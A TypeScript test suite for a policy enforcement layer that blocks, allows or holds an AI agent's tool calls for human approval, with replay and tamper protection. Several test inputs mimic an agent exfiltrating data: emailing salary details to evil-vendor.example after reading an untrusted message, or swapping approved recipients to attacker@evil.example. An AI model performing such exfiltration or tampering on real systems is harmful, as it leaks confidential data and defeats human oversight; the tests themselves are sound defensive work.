import { eq, sql } from "drizzle-orm";
import { describe, expect, it } from "vitest";
import { DEFAULT_POLICY } from "@/server/core/fixtures";
import * as s from "@/server/db/schema";
import { decideApproval } from "@/server/enforcement/approvals";
import { createPolicyVersion } from "@/server/enforcement/policy-store";
import { setup } from "../helpers";

async function effectsCount(db: Awaited<ReturnType<typeof setup>>["db"], toolCallId?: string) {
  const rows = await db.select().from(s.sandboxEffects);
  return toolCallId ? rows.filter((r) => r.toolCallId === toolCallId).length : rows.length;
}

/** Produce a pending external-email approval (REVIEW) for Alice. */
async function pendingExternalEmail(ctx: Awaited<ReturnType<typeof setup>>) {
  const st = await ctx.start("Email the Q3 summary to partner@contoso.example");
  await ctx.pep.enforce(st, { tool: "read_documents", args: { documentIds: ["doc:internal/q3-sales-summary"] }, agentId: ctx.agentId });
  const r = await ctx.pep.enforce(st, {
    tool: "send_email",
    args: { to: "partner@contoso.example", subject: "Q3", body: "Q3 revenue was 4.2M" },
    agentId: ctx.agentId,
  });
  expect(r.decision.decision).toBe("REVIEW");
  expect(r.approvalId).toBeDefined();
  return { st, r, approvalId: r.approvalId! };
}

describe("PEP — allow / block / review", () => {
  it("executes allowed calls and records audit + provenance", async () => {
    const ctx = await setup();
    const st = await ctx.start("Summarize the handbook for me");
    const r = await ctx.pep.enforce(st, { tool: "read_documents", args: { documentIds: ["doc:public/handbook"] }, agentId: ctx.agentId });
    expect(r.decision.decision).toBe("ALLOW");
    expect(r.status).toBe("executed");
    expect(r.output).toContain("Employee Handbook");
    const audit = await ctx.db.select().from(s.auditEvents).where(eq(s.auditEvents.toolCallId, r.toolCallId));
    expect(audit.map((a) => a.type).sort()).toEqual(["tool_call.evaluated", "tool_call.executed"]);
    const prov = await ctx.db.select().from(s.provenanceSources).where(eq(s.provenanceSources.sessionId, st.id));
    expect(prov.map((p) => p.trust).sort()).toEqual(["trusted_user", "untrusted_external"]);
  });

  it("never executes blocked calls (no sandbox effect)", async () => {
    const ctx = await setup();
    const st = await ctx.start("Read the vendor email");
    await ctx.pep.enforce(st, { tool: "read_documents", args: { documentIds: ["doc:inbox/vendor-invoice"] }, agentId: ctx.agentId });
    const r = await ctx.pep.enforce(st, {
      tool: "send_email",
      args: { to: "billing@evil-vendor.example", subject: "salaries", body: "bands" },
      agentId: ctx.agentId,
    });
    expect(r.decision.decision).toBe("BLOCK");
    expect(r.decision.reasons.map((x) => x.code)).toContain("UNTRUSTED_DESTINATION");
    expect(await effectsCount(ctx.db)).toBe(0);
  });

  it("blocks an agent identity that does not own the session", async () => {
    const ctx = await setup();
    const st = await ctx.start("Read the handbook");
    const r = await ctx.pep.enforce(st, { tool: "read_documents", args: { documentIds: ["doc:public/handbook"] }, agentId: "agent_bench" });
    expect(r.decision.reasons[0].code).toBe("IDENTITY_UNVERIFIED");
  });

  it("rejects malformed and unknown tool calls", async () => {
    const ctx = await setup();
    const st = await ctx.start("x");
    const bad = await ctx.pep.enforce(st, { tool: "send_email", args: { to: "not-an-email", subject: "", body: 1 }, agentId: ctx.agentId });
    expect(bad.decision.reasons[0].code).toBe("INVALID_ARGUMENTS");
    const extra = await ctx.pep.enforce(st, { tool: "read_documents", args: { documentIds: ["doc:public/handbook"], sudo: true }, agentId: ctx.agentId });
    expect(extra.decision.reasons[0].code).toBe("INVALID_ARGUMENTS");
    const unknown = await ctx.pep.enforce(st, { tool: "shell", args: {}, agentId: ctx.agentId });
    expect(unknown.decision.reasons[0].code).toBe("UNKNOWN_TOOL");
  });

  it("does not store email bodies verbatim in audit or tool_calls", async () => {
    const ctx = await setup();
    const st = await ctx.start("Email bob@acme.example the roadmap");
    await ctx.pep.enforce(st, {
      tool: "send_email",
      args: { to: "bob@acme.example", subject: "Roadmap", body: "TOP-SECRET-BODY-MARKER password: hunter2" },
      agentId: ctx.agentId,
    });
    const dump = JSON.stringify([
      await ctx.db.select().from(s.auditEvents),
      await ctx.db.select().from(s.toolCalls),
      await ctx.db.select().from(s.sandboxEffects),
    ]);
    expect(dump).not.toContain("TOP-SECRET-BODY-MARKER");
    expect(dump).not.toContain("hunter2");
  });

  it("fails closed when the active policy cannot be loaded", async () => {
    const ctx = await setup();
    const st = await ctx.start("Read the handbook");
    await ctx.db.execute(sql`delete from active_policy`);
    const r = await ctx.pep.enforce(st, { tool: "read_documents", args: { documentIds: ["doc:public/handbook"] }, agentId: ctx.agentId });
    expect(r.decision.decision).toBe("BLOCK");
    expect(r.status).toBe("blocked");
  });
});

describe("Human approval — binding & replay protection", () => {
  it("approve then execute runs exactly once", async () => {
    const ctx = await setup();
    const { r, approvalId } = await pendingExternalEmail(ctx);
    expect(await effectsCount(ctx.db)).toBe(0); // paused
    expect((await decideApproval(ctx.db, { approvalId, actorId: "u_alice", decision: "approve" })).ok).toBe(true);
    const ex = await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: "k1" });
    expect(ex.ok).toBe(true);
    expect(await effectsCount(ctx.db, r.toolCallId)).toBe(1);
    const [tc] = await ctx.db.select().from(s.toolCalls).where(eq(s.toolCalls.id, r.toolCallId));
    expect(tc.pendingArgs).toBeNull();
  });

  it("cannot execute before approval", async () => {
    const ctx = await setup();
    const { approvalId } = await pendingExternalEmail(ctx);
    const ex = await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: "k1" });
    expect(ex).toMatchObject({ ok: false, code: "APPROVAL_NOT_APPROVED" });
  });

  it("replaying a used approval with a new key is denied", async () => {
    const ctx = await setup();
    const { approvalId } = await pendingExternalEmail(ctx);
    await decideApproval(ctx.db, { approvalId, actorId: "u_alice", decision: "approve" });
    await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: "k1" });
    const replay = await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: "k2" });
    expect(replay).toMatchObject({ ok: false, code: "APPROVAL_ALREADY_USED" });
    expect(await effectsCount(ctx.db)).toBe(1);
  });

  it("retry with the same idempotency key returns the original result without re-executing", async () => {
    const ctx = await setup();
    const { approvalId } = await pendingExternalEmail(ctx);
    await decideApproval(ctx.db, { approvalId, actorId: "u_alice", decision: "approve" });
    await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: "k1" });
    const retry = await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: "k1" });
    expect(retry).toMatchObject({ ok: true, replayed: true });
    expect(await effectsCount(ctx.db)).toBe(1);
  });

  it("concurrent executions produce a single side effect", async () => {
    const ctx = await setup();
    const { approvalId } = await pendingExternalEmail(ctx);
    await decideApproval(ctx.db, { approvalId, actorId: "u_alice", decision: "approve" });
    const results = await Promise.all(
      Array.from({ length: 5 }, (_, i) => ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: `c${i}` })),
    );
    expect(results.filter((x) => x.ok).length).toBe(1);
    expect(await effectsCount(ctx.db)).toBe(1);
  });

  it("modified arguments at execution time are rejected", async () => {
    const ctx = await setup();
    const { approvalId } = await pendingExternalEmail(ctx);
    await decideApproval(ctx.db, { approvalId, actorId: "u_alice", decision: "approve" });
    const ex = await ctx.pep.executeApprovedAction({
      approvalId,
      actorId: "u_alice",
      idempotencyKey: "k1",
      args: { to: "attacker@evil.example", subject: "Q3", body: "Q3 revenue was 4.2M" },
    });
    expect(ex).toMatchObject({ ok: false, code: "ARGS_MISMATCH" });
    expect(await effectsCount(ctx.db)).toBe(0);
  });

  it("arguments tampered in storage after approval break the binding", async () => {
    const ctx = await setup();
    const { r, approvalId } = await pendingExternalEmail(ctx);
    await decideApproval(ctx.db, { approvalId, actorId: "u_alice", decision: "approve" });
    await ctx.db
      .update(s.toolCalls)
      .set({ pendingArgs: { to: "attacker@evil.example", subject: "Q3", body: "x" } })
      .where(eq(s.toolCalls.id, r.toolCallId));
    const ex = await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: "k1" });
    expect(ex).toMatchObject({ ok: false, code: "ARGS_TAMPERED" });
    expect(await effectsCount(ctx.db)).toBe(0);
  });

  it("a policy change while pending invalidates the approval", async () => {
    const ctx = await setup();
    const { approvalId } = await pendingExternalEmail(ctx);
    await decideApproval(ctx.db, { approvalId, actorId: "u_alice", decision: "approve" });
    await createPolicyVersion(ctx.db, {
      policyId: "default",
      name: "v2",
      document: DEFAULT_POLICY,
      changeNote: "test",
      actorId: "u_bob",
      activate: true,
    });
    const ex = await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: "k1" });
    expect(ex).toMatchObject({ ok: false, code: "POLICY_CHANGED" });
    const [apr] = await ctx.db.select().from(s.approvals).where(eq(s.approvals.id, approvalId));
    expect(apr.status).toBe("invalidated");
  });

  it("expired approvals cannot be approved or executed", async () => {
    let now = new Date("2026-01-01T00:00:00Z");
    const ctx = await setup({ now: () => now });
    const { approvalId } = await pendingExternalEmail(ctx);
    now = new Date(now.getTime() + 901_000);
    const d = await decideApproval(ctx.db, { approvalId, actorId: "u_alice", decision: "approve", now });
    expect(d).toMatchObject({ ok: false, code: "APPROVAL_EXPIRED" });
  });

  it("approval expiring between approve and execute is denied", async () => {
    let now = new Date();
    const ctx = await setup({ now: () => now });
    const { approvalId } = await pendingExternalEmail(ctx);
    await decideApproval(ctx.db, { approvalId, actorId: "u_alice", decision: "approve", now });
    now = new Date(now.getTime() + 901_000);
    const ex = await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: "k1" });
    expect(ex).toMatchObject({ ok: false, code: "APPROVAL_EXPIRED" });
  });

  it("another member cannot approve or execute someone else's action", async () => {
    const ctx = await setup();
    const { approvalId } = await pendingExternalEmail(ctx);
    expect(await decideApproval(ctx.db, { approvalId, actorId: "u_mallory", decision: "approve" })).toMatchObject({
      ok: false,
      code: "NOT_AUTHORIZED",
    });
    await decideApproval(ctx.db, { approvalId, actorId: "u_bob", decision: "approve" }); // approver role
    const ex = await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_mallory", idempotencyKey: "k1" });
    expect(ex).toMatchObject({ ok: false, code: "NOT_AUTHORIZED" });
  });

  it("rejected approvals cannot be executed", async () => {
    const ctx = await setup();
    const { approvalId } = await pendingExternalEmail(ctx);
    await decideApproval(ctx.db, { approvalId, actorId: "u_alice", decision: "reject" });
    const ex = await ctx.pep.executeApprovedAction({ approvalId, actorId: "u_alice", idempotencyKey: "k1" });
    expect(ex).toMatchObject({ ok: false, code: "APPROVAL_NOT_APPROVED" });
  });
});
